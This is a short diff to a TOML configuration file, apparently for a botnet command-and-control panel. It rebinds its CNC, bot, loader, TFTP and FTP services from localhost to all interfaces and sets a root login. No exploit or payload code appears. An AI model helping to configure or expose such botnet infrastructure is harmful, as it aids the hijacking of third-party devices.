@@ -1,11 +1,10 @@
 ImportTheme = "./themes/theme.toml"
 
-CncServer = "127.0.0.1:3399"
-BotServer = "127.0.0.1:1344"
-LoaderServer = "127.0.0.1:12234"
-TftpServer = "127.0.0.1:12345"
-FtpServer = "127.0.0.1:2323"
-
+CncServer = "0.0.0.0:3399"
+BotServer = "0.0.0.0:1344"
+LoaderServer = "0.0.0.0:12234"
+TftpServer = "0.0.0.0:12345"
+FtpServer = "0.0.0.0:2323"
 
 
 RootLogin = "root"
